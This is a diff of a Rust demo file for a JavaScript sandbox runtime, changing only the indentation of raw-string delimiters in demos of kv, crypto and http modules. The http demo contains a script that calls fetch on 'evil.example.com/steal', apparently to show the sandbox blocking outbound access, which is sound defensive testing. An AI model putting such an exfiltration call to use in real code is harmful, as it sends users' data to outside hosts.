@@ -73,7 +73,7 @@ async fn demo_kv() {
                 const n = (await kv.get("counter")) + 1;
                 await kv.set("counter", n);
                 return n;
-            "#,
+                "#,
                 HashMap::new(),
                 null_tx(),
                 caps(),
@@ -89,7 +89,7 @@ async fn demo_kv() {
             r#"
             import { kv } from "sandbox:kv";
             return await kv.list("counter");
-        "#,
+            "#,
             HashMap::new(),
             null_tx(),
             caps(),
@@ -122,7 +122,7 @@ async fn demo_crypto() {
             console.log("8 random bytes:", Array.from(bytes).join(","));
 
             return { digest, uuid, bytesLen: bytes.length };
-        "#,
+            "#,
             HashMap::new(),
             null_tx(),
             caps(),
@@ -157,7 +157,7 @@ async fn demo_http() {
             r#"
             import { fetch } from "sandbox:http";
             await fetch("https://evil.example.com/steal");
-        "#,
+            "#,
             HashMap::new(),
             null_tx(),
             caps(),
@@ -198,7 +198,7 @@ async fn demo_all_together() {
             console.log("created session for", user);
 
             return { id: id.slice(0, 8) + "...", user };
-        "#,
+            "#,
             {
                 let mut m = HashMap::new();
                 m.insert("user".to_string(), json!("Alice"));
